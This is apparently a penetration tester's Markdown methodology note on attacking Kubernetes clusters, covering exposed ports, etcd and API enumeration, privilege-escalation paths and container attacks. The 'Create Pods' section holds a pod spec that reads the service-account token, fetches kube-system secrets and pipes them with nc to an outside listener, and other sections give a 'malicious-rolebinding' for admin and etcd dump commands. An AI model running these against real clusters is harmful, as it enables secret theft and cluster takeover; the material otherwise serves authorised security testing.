# Pentesting Kubernetes

- [Pentesting Kubernetes](#pentesting-kubernetes)
  - [Attack Surface](#attack-surface)
  - [Unauthenticated Enumeration](#unauthenticated-enumeration)
    - [Search repositories for secrets/credentials](#search-repositories-for-secretscredentials)
    - [Common Ports](#common-ports)
      - [Kubernetes API](#kubernetes-api)
      - [ETCD](#etcd)
      - [Kubelet](#kubelet)
  - [Authenticated Enumeration](#authenticated-enumeration)
    - [Self Subject Review](#self-subject-review)
    - [Enumerate Privileged Accounts](#enumerate-privileged-accounts)
  - [Privilege Escalation Vectors](#privilege-escalation-vectors)
    - [Secrets](#secrets)
    - [Create Pods/Deployments/Daemonsets](#create-podsdeploymentsdaemonsets)
    - [Weak PSP / Security Controls](#weak-psp--security-controls)
    - [Create Roles/Bindings](#create-rolesbindings)
    - [Account/Group Impersonation](#accountgroup-impersonation)
    - [POD Exec](#pod-exec)
  - [Attacks Leveraging Containers](#attacks-leveraging-containers)
    - [Enumeration](#enumeration)
    - [Mounted Service account](#mounted-service-account)
    - [Insecure HostPATH](#insecure-hostpath)
    - [Sniffing](#sniffing)
    - [Scanning](#scanning)
      - [Cloud Credentials](#cloud-credentials)
  - [Methodology checks](#methodology-checks)
  - [Tools and Plugins](#tools-and-plugins)
  - [References and Links](#references-and-links)

## Attack Surface
https://www.microsoft.com/security/blog/2020/04/02/attack-matrix-kubernetes/

Kubernetes attack entrypoints:
- Application - Attacker able to compromise a vulnerability within an application to gain an initial foothold via a pod into the cluster
- Authenticated attackers / malicious insiders - Attacker gains authenticated access by accessing leaked/compromised kubeconfigs or cloud provider credentials such as those leaked in source code.
- Exposed endpoint - Misconfigured ingress, exposed services or Kube-API providing access to cluster resources
- Compromised Images - Backdoored/Vulnerable images from a private or public repository

access to secrets to get access tokens
is a secret managment solution like vault in place - can you access a token that has permissions in vault - check if vault is misconfigured to access multiple secrets...

## Unauthenticated Enumeration
### Search repositories for secrets/credentials
- https://github.com/ovotech/gitoops
- https://github.com/trufflesecurity/TruffleHog
- https://github.com/zricethezav/gitleaks
- https://github.com/michenriksen/gitrob

### Common Ports
By default, kubernetes components listen on the following ports:

- 443/TCP (Kubernetes API Port)
- 6443/TCP (Kubernetes API Port)
- 8443/TCP (Minikube API Port)
- 8080/TCP (Insecure K8s API Port)
- 10250/TCP (kubelet API)
- 10251/TCP (kube-scheduler)
- 10252/TCP (Controller-manager)
- 2379/TCP (etcd Storage)
- 2380/TCP (etcd Storage)
- 6666/TCP (etcd Storage/etcd Client Server) 	
- 4194/TCP (Container Metrics)
- 9099/TCP (calico-felix/Health Check Calico Server) 	
- 6782-4/TCP (Metrics and Endpoints) 	
- 30000-32767/TCP (NodePort services)

#### Kubernetes API
https://kubernetes.io/docs/tasks/administer-cluster/access-cluster-api/

By default, the Kubernetes API should block anonymous access however if it is misconfigured you may be able to use `curl` or the `kubectl` command line utility to issue commands. It may also be possible to use brute force tools such as `gobuster` to discover custom directories
```
curl http(s)://<Kubernetes-Master-Server>:<Port> # format
curl http://localhost:8080/api/v1 # example api directory
kubectl get pods # kubectl example
```

#### ETCD
https://etcd.io/docs/v3.4/dev-guide/interacting_v3/

Access to ETCD should be heavily restricted, however if ETCD is exposed you can use curl and the `etcdctl` binary to interact with it. 
```
curl http://<Kubernetes-Master-Server>:2379
curl http://<Kubernetes-Master-Server>:6666/v2/keys
etcdctl --endpoints=<Kubernetes-Master-Server>:2379 get / --prefix --keys-only
```
If you manage to compromise a TLS certificate and can access ETCD you have effective cluster admin permission as you can read and write all objects within the cluster database
```
etcdctl --endpoints=<Master-Node-IP>:2379 get / --prefix --keys-only
```

#### Kubelet
https://github.com/cyberark/kubeletctl

The `kubeletctl` tool can be used to scan for nodes with an exposed kubelet API. If your able to find a misconfigured kubelet, the tools will help you run commands on containers, retrieve service account tokens and attempt to gain RCE.

## Authenticated Enumeration
If you can gain authenticated access to the API you will want to perform some further enumeration of the cluster to discover secrets and attempt to escalate privileges etc:

### Self Subject Review
https://www.mankier.com/1/kubectl-auth-can-i

The Kube API provides a 'SelfSubjectAccessReview' method which can be used to determine the actions an entity can perform within the cluster. You can use the kubectl auth can-i subcommand for quickly querying the API authorization layer to determine if the current user can perform a given action for a given (or all) resources.

Manually:
```
# One liner to list permissions
kubectl auth can-i --list

# Check all actions and resources - checks if admin
kubectl auth can-i '*' '*'

# Common actions and resources
can-i list/get/create secrets/pods/deployements 

# All namespaces
-A

# A given namespace
-n <namespace> 

# Impersonate a user (if allowed what actions can you perform as that entity)
--as <user/service> 
```

Tools:
- https://github.com/corneliusweig/rakkess - RBAC access matrix tool makes it easy to visualise permissions.

### Enumerate Privileged Accounts
In kubernetes roles and permissions are created and assigned seperately, through roles and rolebindings. Roles can either be clusterwide (clusterroles) or namespaced (roles), and the permissions can be assigned clusterwide (clusterrolebinding) or namespaced (rolebinding).

You may be able to view roles and role bindings to discover privileged accounts within the cluster.

Manually:

```
kubectl get clusterroles -o json | jq . | less
kubectl get clusterrolebindings -o json | jq . | less
kubectl get roles -A -o json | jq . | less
kubectl get rolebindings -A -o json | jq . | less
```

Tools:
- https://github.com/cyberark/KubiScan

## Privilege Escalation Vectors
Detailed information on the following priv esc vectors can be found in the cyber ark blogs in references the following sections cover each area:

### Secrets
If you can retrieve secrets you may be able to elevate your privileges or move laterally to another namespace etc by accessing account tokens. Account tokens are stored as base64 encoded JWT values within secrets, if you can access secrets you can retrieve and decode the JWT and ca.crt to impersonate that service account. these can be passed in requests or saved in the kubeconfig to impersonate that account.

Note - it's also worth checking pod specs, configmaps and secrets for other sensitive information such as SSH keys, OAuth tokens, credentials and URLS for other services may also be stored within kubernetes secrets.

### Create Pods/Deployments/Daemonsets
If you have permission to create pods (directly or via deployments and daemonsets etc) you can attempt to create a pod and mount a privileged service account to the pod either sending the token or capturing a reverse shell to escalate privileges.

An example podSpec:
```
apiVersion: v1
kind: Pod
metadata:
  name: alpine
  namespace: kube-system
spec:
  containers:
  - name: alpine
    image: alpine
    command: ["/bin/sh"]
    args: ["-c", 'apk update && apk add curl --no-cache; cat /run/secrets/kubernetes.io/serviceaccount/token | { read TOKEN; curl -k -v -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" https://192.168.154.228:8443/api/v1/namespaces/kube-system/secrets; } | nc -nv 192.168.154.228 6666; sleep 100000']
  serviceAccountName: bootstrap-signer
  automountServiceAccountToken: true
  hostNetwork: true
```
### Weak PSP / Security Controls
If there are permissive PSPs (or other policy controls) or you have sufficient privileges you may be able to create a pod that mounts a vulnerable hostpath or assigns extra linux capabilties to perform a container breakout and access the nodes kubelet.

If you are able to deploy a daemonset you will get a copy of the pod on each node (you may have to specify taints and tolerations to get it on certain nodes) if you're able to deploy a vulnerable pod and breakout each node may have different privileges - if you are able to breakout onto a master node or access etcd you will have full access to the cluster.

### Create Roles/Bindings
If you have the permission to create rolebindings you can assign extra permissions to yourself or entities under your control. You can also create new roles for persistence.
Example clusterrolebinding for getting cluster-admin
```
{
    "apiVersion": "rbac.authorization.k8s.io/v1",
    "kind": "RoleBinding",
    "metadata": {
        "name": "malicious-rolebinding",
        "namespaces": "default"
    },
    "roleRef": {
        "apiGroup": "*",
        "kind": "ClusterRole",
        "name": "admin"
    },
    "subjects": [
        {
            "kind": "ServiceAccount",
            "name": "sa-comp"
            "namespace": "default"
        }
    ]
}
```

### Account/Group Impersonation
If you have permission to impersonate other accounts they may have more permissions that provide additional privilege escation vectors. You can use curl or kubectl to impersonate accounts.
```
kubectl get pods -A --as=<account>
```

### POD Exec
If you can exec to pods you may be able to breakout of the container to access the host.
```
kubectl exec -it <POD NAME> -n <POD’S NAMESPACE> –- sh
```
## Attacks Leveraging Containers
Useful information regarding container enumeration and breakouts can be found in: [Pentesting Docker](../Docker/Pentesting_Docker.md) for breakouts in particular see the relevant sections for:

- mounted docker socket
- writeable hostpath mount
- linux capabilities/privileged containers

The sections below provide additional information for attacking containers in an orchestration environment:
### Enumeration
The tool - [Amicontained](https://github.com/genuinetools/amicontained) - can be used to find out what container runtime is being used as well as the capabilities available, linEnum and LinPEAS could also provide useful information.

It is worth manully checking the environmental variables as these may produce useful URLs/endpoints or potentially sensitive information:
```
KUBERNETES_SERVICE_HOST # Kubernetes API address
VAULT* # Vault URL / tokens
```
### Mounted Service account
Usually service accounts secrets will be mounted on the container typically this will be in the following directories:
- /run/secrets/kubernetes.io/serviceaccount
- /var/run/secrets/kubernetes.io/serviceaccount

The directory should contain the following files:
- ca.crt: Certificate to secure communications
- Namespace: The current namespace
- token: the JWT for the service account of the pod

Using these you will be able to perform authenticated communication with the API server using curl or by uploading the kubectl binary. You can then use the `auth can-I` method to check privileges for additional attack vectors.

### Insecure HostPATH
You should check to see if there are any risky mount paths that could provide access to sensitive files if it's possible to write to the hostpath you may be able to find an exploit such as dropping an SSH key on the host or adding a user.

### Sniffing
By default there is no encryption in a cluster between pods so this should be provided by a service mesh, as such, it may be possible to sniff traffic using tcpdump. It may also be useful to spin up a sidecar container that proxies traffic to sniff communications a method of which can be found at - https://book.hacktricks.xyz/pentesting/pentesting-kubernetes/enumeration-from-a-pod#sniffing

### Scanning
- Check if services expose any applications
```
kubectl get svc -A
kubectl get svc -n <namespace>
```
- Bash script to scan the IP ranges:
```
sudo apt-get install nmap

nmap-kube () 
{ 
nmap --open -T4 -A -v -Pn -p 443,2379,4194,6782-6784,6443,8443,8080,9099,10250,10255,10256 "${@}"
}
nmap-kube-discover () {
local LOCAL_RANGE=$(ip a | awk '/eth0$/{print $2}' | sed 's,[0-9][0-9]*/.*,*,');                                                                  
local SERVER_RANGES=" ";
SERVER_RANGES+="10.0.0.1 ";
SERVER_RANGES+="10.0.1.* ";
SERVER_RANGES+="10.*.0-1.* ";
nmap-kube ${SERVER_RANGES} "${LOCAL_RANGE}"
}
nmap-kube-discover
```

#### Cloud Credentials



## Methodology checks
Kubernetes version - CVE - kubectl version

check versions

latest/hash images - image pull policy

network segregation - worker to master, API, connect to etcd?

network security - TLS?

Review admission controllers


## Tools and Plugins

Krew
- access-matrix
- get-all
- graph
- outdated
- rbac-lookup
- starboard
- who-can

## References and Links

https://www.optiv.com/insights/source-zero/blog/kubernetes-attack-surface

https://www.microsoft.com/security/blog/2020/04/02/attack-matrix-kubernetes/

https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-3

https://www.cyberark.com/resources/threat-research-blog/securing-kubernetes-clusters-by-eliminating-risky-permissions

https://lobuhisec.medium.com/kubernetes-pentest-recon-checklist-tools-and-resources-30d8e4b69463

